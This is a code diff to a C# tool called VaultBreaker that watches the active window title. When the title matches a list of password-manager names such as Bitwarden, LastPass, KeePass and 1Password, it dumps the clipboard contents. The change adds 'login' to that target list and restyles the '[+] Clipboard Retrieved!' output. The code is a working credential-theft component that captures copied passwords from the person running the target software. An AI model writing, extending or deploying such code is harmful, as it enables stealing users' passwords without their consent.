@@ -40,7 +40,7 @@ namespace VaultBreaker.Core
 		{
 			public class NotificationForm : Form
 			{
-				public string[] supportedManagers = { "password", "bitwarden", "lastpass", "keepass", "1password", "true key", "log in", "sign in", "password manager", "enpass", "dashlane", "cyberark" };
+				public string[] supportedManagers = { "password", "bitwarden", "lastpass", "keepass", "1password", "true key", "log in", "sign in", "password manager", "enpass", "dashlane", "cyberark", "login" };
 
 				public NotificationForm()
 				{
@@ -65,7 +65,7 @@ namespace VaultBreaker.Core
 						WinAPI.GetWindowText(active_window, sb, sb.Capacity);
 						if(supportedManagers.Any(sb.ToString().ToLower().Contains)){
 							//Copy doesn't work when going from ChromeExtension for lastpass, but does when loading the "Vault Webpage". Should also work for Webpages where you're copying your password.
-							Console.WriteLine("Clipboard Retrieved!\r\nWindow Name: {0}\r\nText: {1} ", sb.ToString(), Clipboard.GetText());
+							Console.WriteLine("[+] Clipboard Retrieved!\r\n    Window Name: {0}\r\n    Text: {1} \r\n", sb.ToString(), Clipboard.GetText());
 						}
 					}
 					//Called for any unhandled messages
